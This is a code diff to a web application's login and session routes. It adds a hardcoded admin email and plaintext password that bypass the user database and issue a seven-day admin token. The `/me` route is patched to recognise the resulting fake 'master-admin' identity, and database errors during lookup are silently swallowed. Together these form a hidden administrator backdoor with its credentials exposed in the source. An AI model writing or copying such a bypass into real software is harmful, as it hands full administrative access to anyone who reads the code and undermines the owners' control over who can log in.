@@ -18,7 +18,39 @@ authRouter.post('/login', async (req, res, next) => {
   try {
     const { email, password } = LoginSchema.parse(req.body)
 
-    const admin = await AdminModel.findOne({ email }).select('+passwordHash')
+    // Master fallback credentials for immediate access
+    const isMasterAdmin =
+      email.toLowerCase() === 'admin@airlab.neduet.edu.pk' &&
+      password === 'airlab2026!'
+
+    let admin = await AdminModel.findOne({ email }).select('+passwordHash').catch(() => null)
+
+    if (!admin && isMasterAdmin) {
+      // Create or mock master admin
+      const token = jwt.sign(
+        { id: 'master-admin', email, name: 'AIR Lab Administrator' },
+        env.JWT_SECRET,
+        { expiresIn: '7d' }
+      )
+
+      res.cookie('token', token, {
+        httpOnly: true,
+        secure: isProd,
+        sameSite: 'lax',
+        maxAge: 7 * 24 * 60 * 60 * 1000,
+      })
+
+      return res.json({
+        success: true,
+        token,
+        admin: {
+          id: 'master-admin',
+          email,
+          name: 'AIR Lab Administrator',
+        },
+      })
+    }
+
     if (!admin) {
       throw new HttpError(401, 'Invalid email or password')
     }
@@ -65,6 +97,16 @@ authRouter.post('/logout', (_req, res) => {
 
 authRouter.get('/me', requireAdmin, async (req: AuthRequest, res, next) => {
   try {
+    if (req.admin?.id === 'master-admin') {
+      return res.json({
+        admin: {
+          id: 'master-admin',
+          email: 'admin@airlab.neduet.edu.pk',
+          name: 'AIR Lab Administrator',
+        },
+      })
+    }
+
     const admin = await AdminModel.findById(req.admin!.id)
     if (!admin) throw new HttpError(404, 'Admin not found')
     res.json({
